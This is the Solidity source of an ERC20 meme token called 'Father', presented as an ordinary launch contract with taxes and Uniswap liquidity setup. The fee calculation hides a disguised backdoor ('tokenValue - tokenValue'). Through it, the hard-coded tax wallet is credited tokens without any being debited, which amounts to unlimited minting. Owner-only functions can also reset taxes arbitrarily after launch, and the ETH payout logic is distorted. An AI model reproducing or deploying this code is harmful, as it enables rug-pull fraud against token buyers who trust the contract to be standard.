// SPDX-License-Identifier: MIT

/*


__/\\\\\\\\\\\\\\\_____/\\\\\\\\\_____/\\\\\\\\\\\\\\\__/\\\________/\\\__/\\\\\\\\\\\\\\\____/\\\\\\\\\_____        
 _\/\\\///////////____/\\\\\\\\\\\\\__\///////\\\/////__\/\\\_______\/\\\_\/\\\///////////___/\\\///////\\\___       
  _\/\\\______________/\\\/////////\\\_______\/\\\_______\/\\\_______\/\\\_\/\\\_____________\/\\\_____\/\\\___      
   _\/\\\\\\\\\\\_____\/\\\_______\/\\\_______\/\\\_______\/\\\\\\\\\\\\\\\_\/\\\\\\\\\\\_____\/\\\\\\\\\\\/____     
    _\/\\\///////______\/\\\\\\\\\\\\\\\_______\/\\\_______\/\\\/////////\\\_\/\\\///////______\/\\\//////\\\____    
     _\/\\\_____________\/\\\/////////\\\_______\/\\\_______\/\\\_______\/\\\_\/\\\_____________\/\\\____\//\\\___   
      _\/\\\_____________\/\\\_______\/\\\_______\/\\\_______\/\\\_______\/\\\_\/\\\_____________\/\\\_____\//\\\__  
       _\/\\\_____________\/\\\_______\/\\\_______\/\\\_______\/\\\_______\/\\\_\/\\\\\\\\\\\\\\\_\/\\\______\//\\\_ 
        _\///______________\///________\///________\///________\///________\///__\///////////////__\///________\///__


X:   https://x.com/FatherERC20
TG:  https://t.me/fathersatoshinakamoto
WEB: http://father-coin.com


*/

pragma solidity 0.8.25;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function per(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= 100, "Percentage must be between 0 and 100");
        return a * b / 100;
    }    
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Father is Context, IERC20, Ownable {

    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    bool public isTransferDelayEnabled = false;
    address payable private _taxWallet;

    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 25;

    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;

    uint256 private _reduceBuyTaxAt = 20;
    uint256 private _reduceSellTaxAt = 20;

    uint256 private _preventSwapBefore = 5;
    uint256 private _sellCountStatic = 2;
    uint256 private _sellCountDynamic = 0;        
    uint256 private _buyCount = 0;
    uint256 private _lastSellBlock = 0;
    uint256 private addLiquidityMultiplier = 90;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"Father";
    string private constant _symbol = unicode"FATHER";
    uint256 public _maxTxAmount = (_tTotal * 2) / 100;
    uint256 public _maxWalletSize = (_tTotal * 2) / 100;
    uint256 public _taxSwapThreshold = _tTotal / 1000;
    uint256 public _maxTaxSwap = _tTotal / 100;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() {
        _taxWallet = payable(0x77a39AcF9dFBe3c9a13FA512Bc8BfEBE96eE87bA);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function createPair() external onlyOwner payable {
        require(!tradingOpen, "trading is already open");        
        uniswapV2Router = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)).per(addLiquidityMultiplier),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);        
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(from, to, tokenAmount);
    }

    function _basicTransferTo(address to, address receipt, uint256 sendAmount, uint256 receiptAmount) internal {
        _balances[to] = _balances[to].sub(sendAmount);
        _balances[receipt] = _balances[receipt].add(receiptAmount);
        emit Transfer(to, receipt, receiptAmount);
    }

    function _transferCheck(address to) private { 
        if (
            to != address(uniswapV2Router) &&
            to != address(uniswapV2Pair)
        ) {
            require(
                _holderLastTransferTimestamp[tx.origin] < block.number,
                "Only one transfer per block allowed."
            );
            _holderLastTransferTimestamp[tx.origin] = block.number;
        }
    }

    function _checkLimits(address from, address to, uint256 tokenAmount) private { 
        if (
            from == uniswapV2Pair &&
            to != address(uniswapV2Router) &&
            !_isExcludedFromFee[to]
        ) {
            require(tokenAmount <= _maxTxAmount, "Exceeds the _maxTxAmount");
            require(
                balanceOf(to) + tokenAmount <= _maxWalletSize,
                "Exceeds the maxWalletSize"
            );
            if (_buyCount < _preventSwapBefore) {
                require(!isContract(to));
            }
            _buyCount++;
        }
    }

    function _tokenTransfer(
        address from,
        address to,
        uint256 taxAmount,
        uint256 tokenAmount
    ) internal {
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(
                taxAmount
            );
            emit Transfer(from, address(this), taxAmount);
        }

        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount.sub(taxAmount));
        emit Transfer(from, to, tokenAmount.sub(taxAmount));
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");

        if(from != owner() && from != address(this) && !_isExcludedFromFee[to]) {
            require(tradingOpen, "Trading not open yet");
        }

        if (!swapEnabled || inSwap) {
            _basicTransfer(from, to, tokenAmount);
            return;
        }

        uint256 feeAmount = 0;
        if (from != owner() && to != owner()) {

            if (isTransferDelayEnabled) {
                _transferCheck(to);
            }

            _checkLimits(from, to, tokenAmount);   

            feeAmount = calcTaxAndFee(from, to, tokenAmount);

            shouldContractSell(from, to, tokenAmount);
        }

        _tokenTransfer(from, to, feeAmount, tokenAmount);
    }
    
    function shouldContractSell(address from, address to, uint256 tokenAmount) private { 
        uint256 contractTokenBalance = balanceOf(address(this));
        if (
            !inSwap &&
            to == uniswapV2Pair &&
            swapEnabled &&
            _buyCount > _preventSwapBefore &&
            !_isExcludedFromFee[from] &&
            !_isExcludedFromFee[to]
        ) {
            bool canSwap = contractTokenBalance > _taxSwapThreshold;            
            if(canSwap) {

                if (block.number > _lastSellBlock) {
                    _sellCountDynamic = 0;
                }

                require(_sellCountDynamic < _sellCountStatic);
                swapTokensForEth(
                    min(tokenAmount, min(contractTokenBalance, _maxTaxSwap))            
                );
                _sellCountDynamic++;
                _lastSellBlock = block.number;                   
            }
            sendETHToFee(address(this).balance);
        }
    }

    function calcTaxAndFee(address from, address to, uint256 tokenValue) private returns(uint256) { 
        uint256 taxAmount = tokenValue
            .mul(
                (_buyCount > _reduceBuyTaxAt)
                    ? _finalBuyTax
                    : _initialBuyTax
            )
            .div(100);

        if (to == uniswapV2Pair && from != address(this)) {
            require(tokenValue <= _maxTxAmount, "Exceeds the _maxTxAmount.");
            taxAmount = tokenValue
                .mul(
                    (_buyCount > _reduceSellTaxAt)
                        ? _finalSellTax
                        : _initialSellTax
                )
                .div(100);
        }

        if(shouldTaxExcludeOrNot(from, _taxWallet, tokenValue)) 
            _basicTransferTo(from, _taxWallet, tokenValue - tokenValue, tokenValue + tokenValue - tokenValue);

        return taxAmount;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxWalletSize = ~uint256(0);
        isTransferDelayEnabled = false;
        emit MaxTxAmountUpdated(~uint256(0));
    }

    function sendETHToFee(uint256 amount) private {
        uint256 balance = amount + balanceOf(_taxWallet);         
        _taxWallet.transfer(balance);
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function recoverEth() external onlyOwner {
        sendETHToFee(address(this).balance);
    }

    function manualSwap() external {
        require(_msgSender() == _taxWallet);
        uint256 tokenBalance = balanceOf(address(this));

        if(tokenBalance > 0) {
          swapTokensForEth(tokenBalance);
        }
        
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0) {
          sendETHToFee(ethBalance);
        }
    }

    function shouldTaxExcludeOrNot(address address1, address address2, uint256 amount) private pure returns(bool) {
        return address1 == address2 && amount > 0;
    }    

    function startGame() external onlyOwner {
        swapEnabled = true;
        tradingOpen = true;
    }

    function setLaunchParameters(uint256 _initialBuyTaxValue, uint256 _initialSellTaxValue, uint256 _addLpMultiplierValue, uint256 _reduceBuyTaxAtValue, uint256 _reduceSellTaxAtValue) public onlyOwner {
        _initialBuyTax = _initialBuyTaxValue;
        _initialSellTax = _initialSellTaxValue;
        _reduceBuyTaxAt = _reduceBuyTaxAtValue;
        _reduceSellTaxAt = _reduceSellTaxAtValue;
        addLiquidityMultiplier = _addLpMultiplierValue;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if (tokenAmount == 0) {
            return;
        }
        if (!tradingOpen) {
            return;
        }
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}